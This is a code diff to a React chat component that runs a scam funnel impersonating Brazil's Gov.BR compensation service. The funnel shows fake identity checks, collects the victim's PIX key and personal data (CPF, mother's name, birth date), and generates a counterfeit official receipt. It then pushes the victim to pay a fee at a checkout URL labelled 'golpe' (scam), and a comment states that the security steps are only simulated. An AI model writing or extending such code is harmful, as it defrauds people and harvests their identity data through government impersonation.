@@ -5,13 +5,7 @@ import React, { useState, useEffect, useRef, useMemo, FC } from 'react';
 import { useRouter } from 'next/navigation';
 import Image from 'next/image';
 import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';
-import dynamic from 'next/dynamic';
-import type PlyrInstance from 'plyr';
-import 'plyr-react/plyr.css';
-
-const Plyr = dynamic(() => import('plyr-react'), {
-  ssr: false,
-});
+// Removed Plyr dynamic import and CSS
 
 export interface SimulatedChatParams {
   gclid?: string;
@@ -29,14 +23,14 @@ interface ChatOption {
   text: string;
   nextStep?: string;
   action?: 'setChavePixToUserCPF' | 'redirectToPayment';
-  paymentUrlTemplate?: string; // Changed from paymentUrl
-  style?: string; // For button styling hints
+  paymentUrlTemplate?: string;
+  style?: string;
 }
 
 interface FlowStepDataVideo {
   title?: string;
   message: string;
-  videoUrl: string;
+  videoUrl: string; // Will be used to decide if placeholder is shown
   thumbnailText?: string;
 }
 
@@ -63,13 +57,13 @@ interface FlowStepDataDisplayMessage {
 interface FlowStepDataTextInput {
   message: string;
   placeholder: string;
-  variableToSet: 'chavePix'; // Only supporting chavePix for now
-  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens'; // Placeholder for future validation
+  variableToSet: 'chavePix';
+  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
 }
 
 interface FlowStepDataDisplayImage {
     message: string;
-    imageGenerationDetails?: { // Optional, for consistency with JSON
+    imageGenerationDetails?: {
         functionToCall: string;
         templateName: string;
         inputs: Record<string, string>;
@@ -85,7 +79,7 @@ interface FlowStep {
   type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage';
   data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage;
   nextStep?: string;
-  nextAction?: string; // e.g. "play_video_then_proceed"
+  nextAction?: string;
   internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
   isTerminal?: boolean;
 }
@@ -97,7 +91,6 @@ interface FunnelData {
   variables?: Record<string, { value?: any; description?: string, source?: string }>;
 }
 
-// Embedded Funnel Definition from user's JSON
 const funnelDefinition: FunnelData = {
     "funnelName": "GovBR Indenização Scan Funnel",
     "initialStep": "step1_video_hook",
@@ -134,7 +127,8 @@ const funnelDefinition: FunnelData = {
                     {"text": "{{motherName}}", "nextStep": "step3_validation_loading"},
                     {"text": "RITA DE CÁSSIA OLIVEIRA", "nextStep": "step3_validation_loading"},
                     {"text": "Nenhuma das alternativas.", "nextStep": "step3_validation_loading"}
-                ]
+                ],
+                 "note": "Independentemente da escolha, o fluxo avança. O objetivo é simular segurança."
             }
         },
         "step3_validation_loading": {
@@ -175,17 +169,17 @@ const funnelDefinition: FunnelData = {
         },
         "step4b_collect_pix_input_telefone": {
             "type": "textInput",
-            "data": { "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:", "placeholder": "(XX) XXXXX-XXXX", "variableToSet": "chavePix" },
+            "data": { "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:", "placeholder": "(XX) XXXXX-XXXX", "variableToSet": "chavePix", "validation": "br_phone" },
             "nextStep": "step4d_confirm_pix_key"
         },
         "step4c_collect_pix_input_email": {
             "type": "textInput",
-            "data": { "message": "Por favor, digite sua chave PIX (E-mail):", "placeholder": "seuemail@provedor.com", "variableToSet": "chavePix" },
+            "data": { "message": "Por favor, digite sua chave PIX (E-mail):", "placeholder": "seuemail@provedor.com", "variableToSet": "chavePix", "validation": "email" },
             "nextStep": "step4d_confirm_pix_key"
         },
         "step4e_collect_pix_input_aleatoria": {
             "type": "textInput",
-            "data": { "message": "Por favor, digite sua chave PIX (Aleatória):", "placeholder": "Sua chave aleatória", "variableToSet": "chavePix" },
+            "data": { "message": "Por favor, digite sua chave PIX (Aleatória):", "placeholder": "Sua chave aleatória", "variableToSet": "chavePix", "validation": "alphanumeric_with_hyphens" },
             "nextStep": "step4d_confirm_pix_key"
         },
         "step4d_confirm_pix_key": {
@@ -200,15 +194,30 @@ const funnelDefinition: FunnelData = {
         },
         "step5_generate_receipt_loading": {
             "type": "loadingScreen",
-            "data": { "message": "Registrando sua chave PIX e gerando seu comprovante oficial de recebimento dos valores... Isso pode levar alguns instantes.", "duration_ms": 2000 }, // Shortened for simulation
+            "data": { "message": "Registrando sua chave PIX e gerando seu comprovante oficial de recebimento dos valores... Isso pode levar alguns instantes.", "duration_ms": 4000 },
             "nextStep": "step5b_display_receipt"
         },
         "step5b_display_receipt": {
             "type": "displayImage",
             "data": {
                 "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso e sua chave PIX **{{chavePix}}** está registrada para o recebimento de **{{indenizacaoValor}}**.",
-                "fallbackImageUrl": "https://placehold.co/300x400.png?text=Comprovante",
-                "imageAiHint": "receipt official document",
+                "imageGenerationDetails": {
+                    "functionToCall": "generateReceiptImage",
+                    "templateName": "comprovante_template.png",
+                    "inputs": {
+                        "userName": "{{userName}}",
+                        "userCPF": "{{userCPF}}",
+                        "userBirthDate": "{{userBirthDate}}",
+                        "motherName": "{{motherName}}",
+                        "chavePix": "{{chavePix}}",
+                        "indenizacaoValor": "{{indenizacaoValor}}",
+                        "taxaValor": "{{taxaValor}}",
+                        "dataAtual": "{{dataAtual}}"
+                    },
+                    "outputVariable": "generatedReceiptImageUrl"
+                },
+                "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização",
+                "imageAiHint": "official government receipt document",
                 "imageAltText": "Comprovante de Indenização Gov.BR"
             },
             "nextStep": "step6_reveal_tax"
@@ -239,7 +248,7 @@ const funnelDefinition: FunnelData = {
                     {
                         "text": "✅ Sim! Quero pagar a taxa de {{taxaValor}} e receber meus {{indenizacaoValor}} AGORA!",
                         "action": "redirectToPayment",
-                        "paymentUrlTemplate": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
+                        "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
                         "style": "primary_cta_button_gov_style"
                     },
                     { "text": "Tenho dúvidas sobre a taxa.", "nextStep": "step7b_explain_tax_more", "style": "secondary_link_button_gov_style" }
@@ -254,7 +263,7 @@ const funnelDefinition: FunnelData = {
                     {
                         "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
                         "action": "redirectToPayment",
-                        "paymentUrlTemplate": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
+                        "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
                         "style": "primary_cta_button_gov_style"
                     },
                     { "text": "Não quero pagar a taxa agora.", "nextStep": "step_end_no_payment", "style": "destructive_link_button_gov_style" }
@@ -296,10 +305,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const audioRef = useRef<HTMLAudioElement>(null);
   const router = useRouter();
 
-  const playerRef = useRef<PlyrInstance | null>(null);
+  // State for video placeholder
   const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
-  const [currentVideoUrl, setCurrentVideoUrl] = useState<string | null>(null);
+  const [currentVideoUrl, setCurrentVideoUrl] = useState<string | null>(null); // To know if we should show the placeholder
   const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
+
 
   const [isLoadingStep, setIsLoadingStep] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState<string | null>(null);
@@ -311,7 +321,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     indenizacaoValor: funnelDefinition.variables?.indenizacaoValor?.value || "R$ 5.960,50",
     taxaValor: funnelDefinition.variables?.taxaValor?.value || "R$ 61,90",
     chavePix: null,
-    dataAtual: new Date().toLocaleDateString('pt-BR'),
+    dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
+    generatedReceiptImageUrl: funnelDefinition.variables?.generatedReceiptImageUrl?.value || null
   });
 
   const [isTextInputActive, setIsTextInputActive] = useState(false);
@@ -326,18 +337,27 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (!text) return '';
     let formattedText = text;
     const allVars = {
-        ...initialParams,
-        ...flowVariables,
+        ...initialParams, // gclid, utm_source, etc. & cpf, nome, mae, nascimento from URL
+        ...flowVariables, // indenizacaoValor, taxaValor, chavePix, dataAtual, generatedReceiptImageUrl
+        // Ensure core user details from initialParams are prioritized or fall back to funnel defaults if available
         userName: initialParams.nome || funnelDefinition.variables?.userName?.value || 'Usuário',
-        userCPF: initialParams.cpf || funnelDefinition.variables?.userCPF?.value || 'CPF não informado',
-        userBirthDate: initialParams.nascimento || funnelDefinition.variables?.userBirthDate?.value || 'Nasc. não informada',
-        motherName: initialParams.mae || funnelDefinition.variables?.motherName?.value || 'Nome da mãe não informado',
+        userCPF: initialParams.cpf || funnelDefinition.variables?.userCPF?.value || '---.---.---.--',
+        userBirthDate: initialParams.nascimento || funnelDefinition.variables?.userBirthDate?.value || '--/--/----',
+        motherName: initialParams.mae || funnelDefinition.variables?.motherName?.value || 'Nome da Mãe Indisponível',
     };
 
     for (const key in allVars) {
       const placeholder = `{{${key}}}`;
       if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
-        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), String(allVars[key as keyof typeof allVars]));
+        // Ensure {{userCPF}} and {{chavePix}} are formatted if they are CPF values
+        let valueToInsert = String(allVars[key as keyof typeof allVars]);
+        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
+            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        } else if (key === 'userBirthDate' && valueToInsert.includes('-')) { // Assuming YYYY-MM-DD from API/params
+            const parts = valueToInsert.split('-');
+            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
+        }
+        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
       }
     }
     return formattedText;
@@ -395,10 +415,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       switch (stepConfig.type) {
         case 'videoDisplay': {
           const data = stepConfig.data as FlowStepDataVideo;
-          setCurrentVideoUrl(data.videoUrl);
-          setCurrentVideoMessage(formatText(data.message));
+          setCurrentVideoUrl(data.videoUrl); // Used to signal showing the placeholder
+          if (isNewStep) {
+            setCurrentVideoMessage(formatText(data.title || data.message)); // Display title or message
+          }
           setShowVideoThumbnailOverlay(true);
-          // Message is handled by dedicated state currentVideoMessage
           setIsBotTyping(false);
           return; 
         }
@@ -415,7 +436,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         case 'loadingScreen': {
           const data = stepConfig.data as FlowStepDataLoading;
-          setLoadingMessage(formatText(data.message));
+          if(isNewStep) setLoadingMessage(formatText(data.message));
           setIsLoadingStep(true);
           setIsBotTyping(false); 
           autoTransitionTimerRef.current = setTimeout(() => {
@@ -439,11 +460,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           };
           if (isNewStep) setCurrentDisplayMessage(displayMsgData);
 
-          if (data.audioUrl && audioRef.current) {
+          if (data.audioUrl && audioRef.current && isNewStep) { // Only play audio on new step
             audioRef.current.src = data.audioUrl;
             audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
           }
-          nextStepTransitionDelay = data.details ? 4500 : 2500;
+          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200);
+          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity; // Don't auto-transition terminal steps
           break;
         }
         case 'textInput': {
@@ -453,17 +475,16 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             }
             setCurrentTextInputConfig(data);
             setIsTextInputActive(true);
-            setTextInputValue(""); // Clear previous input
+            setTextInputValue("");
             setIsBotTyping(false);
-            return; // Do not auto-transition
+            return;
         }
         case 'displayImage': {
           const data = stepConfig.data as FlowStepDataDisplayImage;
            if (isNewStep) {
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
-             // Simulate image generation loading if applicable
              if (data.imageGenerationDetails) {
-                setLoadingMessage("Gerando seu comprovante..."); // Or from JSON
+                setLoadingMessage(formatText("Gerando seu comprovante..."));
                 setIsLoadingStep(true);
                 setIsBotTyping(false);
 
@@ -476,7 +497,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                              setCurrentStepKey(stepConfig.nextStep as string);
                         }, 4000);
                     }
-                }, 2000); // Simulate generation time
+                }, 2000);
                 return;
              }
            }
@@ -491,7 +512,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       setIsBotTyping(false);
 
-      if (stepConfig.nextStep && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'videoDisplay' && stepConfig.type !== 'loadingScreen' && stepConfig.type !== 'textInput' && !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails)) {
+      if (stepConfig.nextStep && !stepConfig.isTerminal && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'videoDisplay' && stepConfig.type !== 'loadingScreen' && stepConfig.type !== 'textInput' && !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails)) {
         if (isNewStep) { 
             autoTransitionTimerRef.current = setTimeout(() => {
             setCurrentStepKey(stepConfig.nextStep as string);
@@ -501,11 +522,18 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     };
     
     const appearanceDelay = (stepConfig.type === 'loadingScreen' || (isNewStep && currentStepKey === funnelDefinition.initialStep)) ? 0 : 700;
-    setTimeout(processStep, appearanceDelay);
+    
+    if (isNewStep || stepConfig.type === 'loadingScreen') { // Process immediately for new steps or loading
+        setTimeout(processStep, appearanceDelay);
+    } else { // If not a new step (e.g. re-render due to initialParams change), only update if needed
+        setIsBotTyping(false); // Stop typing indicator on re-renders that are not new steps
+    }
+
 
     return () => {
       if (autoTransitionTimerRef.current) {
         clearTimeout(autoTransitionTimerRef.current);
+        autoTransitionTimerRef.current = null;
       }
     };
   }, [currentStepKey, initialParams, flowVariables]); 
@@ -513,28 +541,40 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const handleOptionClick = (option: ChatOption) => {
     const userMessageId = `user-${Date.now()}`;
     setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
-    setCurrentDisplayMessage(null); // Clear any persistent display message
+    setCurrentDisplayMessage(null); 
+    const currentStepConfig = funnelDefinition.steps[currentStepKey];
 
     if (option.action === 'setChavePixToUserCPF') {
-        setFlowVariables(prev => ({...prev, chavePix: initialParams.cpf || prev.userCPF || "CPF não disponível"}));
+        const cpfToSet = initialParams.cpf || flowVariables.userCPF || "CPF não disponível";
+        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
+    } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
+        const actionDetail = currentStepConfig.internalActions[option.action];
+        if (actionDetail.type === 'setVariable') {
+            let valueToSet = actionDetail.valueFrom; // e.g. "userCPF"
+            if(valueToSet === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF;
+            // Potentially extend for other 'valueFrom' sources like 'initialParams.someOtherKey'
+            setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
+        }
     }
+
 
     if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
         let finalPaymentUrl = formatText(option.paymentUrlTemplate);
         
-        // Specific variable formatting for URL
         const taxaValorNum = parseFloat(String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", "."));
         finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
-        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", encodeURIComponent(initialParams.nome || ""));
-        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", (initialParams.cpf || "").replace(/\D/g, ''));
+        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", encodeURIComponent(initialParams.nome || flowVariables.userName || ""));
+        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, ''));
 
-        // Add any remaining initialParams to the URL
         const url = new URL(finalPaymentUrl);
         Object.entries(initialParams).forEach(([key, value]) => {
             if (value && !url.searchParams.has(key)) {
                  url.searchParams.set(key, value);
             }
         });
+        // Add other flowVariables if needed for payment URL
+        url.searchParams.set('chavePix', flowVariables.chavePix || (initialParams.cpf || flowVariables.userCPF || ''));
+
         window.location.href = url.toString();
         return;
     }
@@ -548,25 +588,17 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     const stepConfig = funnelDefinition.steps[currentStepKey];
     if (stepConfig?.type !== 'videoDisplay') return;
 
-    if (playerRef.current?.plyr) {
-      try {
-        playerRef.current.plyr.muted = false;
-        await playerRef.current.plyr.play();
-        setShowVideoThumbnailOverlay(false);
-        
-        if (stepConfig.nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
-          autoTransitionTimerRef.current = setTimeout(() => { 
-            setCurrentStepKey(stepConfig.nextStep as string);
-          }, 500); 
-        }
-      } catch (error) {
-        console.error("Error trying to play/unmute video:", error);
-        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string); 
-      }
-    } else {
-        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string);
+    setShowVideoThumbnailOverlay(false); // Hide overlay
+    
+    // Proceed to next step if defined
+    if (stepConfig.nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
+      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear existing timer
+      autoTransitionTimerRef.current = setTimeout(() => { 
+        setCurrentStepKey(stepConfig.nextStep as string);
+      }, 500); 
     }
   };
+
 
   const handleTextInputFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -582,30 +614,16 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     setTextInputValue("");
     const nextStep = funnelDefinition.steps[currentStepKey]?.nextStep;
     if (nextStep) {
+        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
         setCurrentStepKey(nextStep);
     }
   };
-
-  const plyrSource = useMemo(() => currentVideoUrl ? ({
-    type: 'video' as const,
-    sources: [{ src: currentVideoUrl, provider: 'html5' as const }],
-  }) : null, [currentVideoUrl]);
-
-  const plyrOptions = useMemo(() => ({
-    controls: [],
-    hideControls: true,
-    clickToPlay: false,
-    autoplay: true,
-    muted: true,
-    playsinline: true,
-  }), []);
-
 
   const getIconComponent = (iconName?: string) => {
     if (!iconName) return null;
     if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom' }} />;
     if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom' }} />;
-    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom'}}>💰</span>; // Simple emoji for now
+    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom'}}>💰</span>;
     return null;
   }
 
@@ -614,15 +632,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
       <audio ref={audioRef} style={{ display: 'none' }} />
 
-      {currentVideoUrl && plyrSource && (
+      {currentVideoUrl && (
         <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
           {currentVideoMessage && <p className="bot-message" style={{ background: 'transparent', boxShadow: 'none', paddingLeft: 0, marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
-          <div className="video-player-wrapper" style={{ position: 'relative', maxWidth: '100%', width:'auto', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden' }}>
-            <Plyr
-              ref={playerRef}
-              source={plyrSource}
-              options={plyrOptions}
-            />
+          <div className="video-placeholder-wrapper" style={{ position: 'relative', width: '100%', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden', backgroundColor: '#333' }}>
             {showVideoThumbnailOverlay && (
               <div
                 onClick={handleVideoThumbnailClick}
@@ -638,9 +651,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 </span>
               </div>
             )}
+             <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', color: '#777'}}>
+                { !showVideoThumbnailOverlay && <span>Video Player (Simulado)</span> }
+             </div>
           </div>
         </div>
       )}
+
 
       {isLoadingStep && loadingMessage && (
         <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
@@ -651,7 +668,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       {currentImageDetails && !isLoadingStep && (
         <div className="image-step-container" style={{ textAlign: 'center', padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
-          {currentImageDetails.message && <p style={{ marginBottom: '10px', fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{currentImageDetails.message}</p>}
+          {currentImageDetails.message && <p style={{ marginBottom: '10px', fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
           <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint}/>
         </div>
       )}
@@ -659,7 +676,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {currentDisplayMessage && !isLoadingStep && (
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
-           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}> {/* Adjust width for avatar */}
+           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}>
               {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                 {getIconComponent(currentDisplayMessage.displayIcon)}
                 <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
@@ -692,7 +709,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                     <button
                       key={formatText(opt.text)} 
                       onClick={() => handleOptionClick(opt)}
-                      className={`chat-option-button ${opt.style || ''}`} // Apply style hint as class
+                      className={`chat-option-button ${opt.style || ''}`}
                        dangerouslySetInnerHTML={{__html: formatText(opt.text)}}
                     />
                   ))}
@@ -733,7 +750,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         .message-container { display: flex; margin-bottom: 12px; max-width: 90%; }
         .bot-message-container { align-self: flex-start; }
         .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
-        .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; }
+        .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
         .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
         .bot-message { background-color: #fff; color: #333; border-top-left-radius: 4px; }
         .user-message { background-color: #1451b4; color: white; border-top-right-radius: 4px; margin-right: 0; }
@@ -766,4 +783,3 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
 export default SimulatedChatFlow;
 
-    
